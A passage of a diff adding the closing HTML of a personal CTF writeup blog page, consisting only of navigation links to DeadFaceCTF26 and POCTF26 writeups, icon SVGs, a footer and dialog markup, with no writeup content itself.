+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a></li><li><a href="deadfacectf26-CerealKiller01.html"><span>DeadFaceCTF26 / Cereal Killer 01</span><small>Oct 19, 2026</small><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a></li><li><a href="deadfacectf26-CerealKiller02.html"><span>DeadFaceCTF26 / Cereal Killer 02</span><small>Oct 19, 2026</small><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a></li><li><a href="deadfacectf26-CerealKiller03.html"><span>DeadFaceCTF26 / Cereal Killer 03</span><small>Oct 19, 2026</small><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a></li><li><a href="deadfacectf26-CerealKiller04.html"><span>DeadFaceCTF26 / Cereal Killer 04</span><small>Oct 19, 2026</small><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a></li><li><a href="deadfacectf26-CursedLibrary.html"><span>DeadFaceCTF26 / Cursed Library</span><small>Oct 19, 2026</small><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a></li><li><a href="deadfacectf26-CursedMirror.html" aria-current="page"><span>DeadFaceCTF26 / Cursed Mirror</span><small>THIS WRITEUP</small><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a></li><li><a href="deadfacectf26-ItButAWeeBitReverse.html"><span>DeadFaceCTF26 / It But A Wee Bit Reverse</span><small>Oct 19, 2026</small><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a></li><li><a href="deadfacectf26-SkeletonKey.html"><span>DeadFaceCTF26 / Skeleton Key</span><small>Oct 19, 2026</small><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a></li><li><a href="deadfacectf26-TheCrypt.html"><span>DeadFaceCTF26 / The Crypt</span><small>Oct 19, 2026</small><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a></li></ol></section>
+    <section class="more-notes" aria-labelledby="more-title"><div class="section-label"><h2 id="more-title">Keep the thread going</h2><span>MORE FROM THE NOTEBOOK</span></div><a class="related-note" href="deadfacectf26-Necromancy.html"><span><small>WRITEUP</small><strong>DeadFaceCTF26 / Necromancy</strong></span><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a><a class="related-note" href="deadfacectf26-CerealKiller01.html"><span><small>WRITEUP</small><strong>DeadFaceCTF26 / Cereal Killer 01</strong></span><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a></section>
+  
+    <footer class="site-footer">
+      <div class="footer-credit"><span>Notes by a horse. &copy; 2026</span><span>Made of curiosity &amp; a little bit of chaos.</span></div>
+      <div class="support-links" aria-label="Support this site">
+        <span>Enjoying the notebook?</span>
+        <a class="support-button" href="https://github.com/Adrian-C-1" target="_blank" rel="noopener noreferrer">Support me</a>
+        <a class="support-button support-button-primary" href="https://github.com/Adrian-C-1/Adrian-C-1.github.io" target="_blank" rel="noopener noreferrer">Star this site</a>
+      </div>
+    </footer>
+  </main>
+  <button class="mobile-toc-button" type="button" aria-label="Open table of contents" aria-expanded="false" aria-controls="mobile-toc"><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-list"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M3 12h.01" />
+  <path d="M3 18h.01" />
+  <path d="M3 6h.01" />
+  <path d="M8 12h13" />
+  <path d="M8 18h13" />
+  <path d="M8 6h13" />
+</svg>
+<span>Contents</span></button><dialog class="reader-dialog" id="mobile-toc"><header><h2>On this page</h2><button class="icon-button close-dialog" type="button" aria-label="Close contents"><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-x"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M18 6 6 18" />
+  <path d="m6 6 12 12" />
+</svg>
+</button></header><nav class="mobile-toc"><a href="#solve" class="toc-link" data-heading="solve"><span class="toc-mark" aria-hidden="true">01</span><span class="toc-label">Solve</span></a></nav></dialog>
+  <dialog class="reader-dialog" id="library"><header><h2>The notebook</h2><button class="icon-button close-dialog" type="button" aria-label="Close notebook"><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-x"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M18 6 6 18" />
+  <path d="m6 6 12 12" />
+</svg>
+</button></header><div class="library-list"><a href="archive.html"><small>ALL ENTRIES</small><span>Browse the archive</span><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a><a href="deadfacectf26-Necromancy.html"><small>WRITEUP</small><span>DeadFaceCTF26 / Necromancy</span><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a><a href="deadfacectf26-CerealKiller01.html"><small>WRITEUP</small><span>DeadFaceCTF26 / Cereal Killer 01</span><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a><a href="deadfacectf26-CerealKiller02.html"><small>WRITEUP</small><span>DeadFaceCTF26 / Cereal Killer 02</span><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a><a href="deadfacectf26-CerealKiller03.html"><small>WRITEUP</small><span>DeadFaceCTF26 / Cereal Killer 03</span><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a><a href="deadfacectf26-CerealKiller04.html"><small>WRITEUP</small><span>DeadFaceCTF26 / Cereal Killer 04</span><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a><a href="deadfacectf26-CursedLibrary.html"><small>WRITEUP</small><span>DeadFaceCTF26 / Cursed Library</span><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a><a href="deadfacectf26-CursedMirror.html"><small>WRITEUP</small><span>DeadFaceCTF26 / Cursed Mirror</span><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a><a href="deadfacectf26-ItButAWeeBitReverse.html"><small>WRITEUP</small><span>DeadFaceCTF26 / It But A Wee Bit Reverse</span><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a><a href="deadfacectf26-SkeletonKey.html"><small>WRITEUP</small><span>DeadFaceCTF26 / Skeleton Key</span><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a><a href="deadfacectf26-TheCrypt.html"><small>WRITEUP</small><span>DeadFaceCTF26 / The Crypt</span><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a><a href="pointeroverflowctf26-commit-to-memory.html"><small>WRITEUP</small><span>POCTF26 / Commit to Memory</span><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a><a href="pointeroverflowctf26-excavation.html"><small>WRITEUP</small><span>POCTF26 / Excavation</span><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a><a href="pointeroverflowctf26-invisible-ink.html"><small>WRITEUP</small><span>POCTF26 / Invisible Ink</span><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a><a href="pointeroverflowctf26-no-structure-required.html"><small>WRITEUP</small><span>POCTF26 / No Structure Required</span><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a><a href="intro.html"><small>JOURNAL</small><span>Pilot</span><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a><a href="pointeroverflowctf26-poisoned-well.html"><small>WRITEUP</small><span>POCTF26 / Poisoned Well</span><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a><a href="pointeroverflowctf26-the-shape-of-a-query.html"><small>WRITEUP</small><span>POCTF26 / The Shape of a Query</span><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-arrow-up-right"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M7 7h10v10" />
+  <path d="M7 17 17 7" />
+</svg>
+</a></div></dialog>
+  <dialog class="image-dialog" id="image-viewer"><button class="icon-button close-dialog" type="button" aria-label="Close image"><!-- @license lucide-static v0.468.0 - ISC -->
+<svg aria-hidden="true" focusable="false"   class="lucide lucide-x"
+  xmlns="http://www.w3.org/2000/svg"
+  width="24"
+  height="24"
+  viewBox="0 0 24 24"
+  fill="none"
+  stroke="currentColor"
+  stroke-width="2"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+>
+  <path d="M18 6 6 18" />
+  <path d="m6 6 12 12" />
+</svg>
+</button><img alt=""><p></p></dialog>
+  <div class="sr-only" role="status" id="reader-status"></div>
+</body>
+</html>
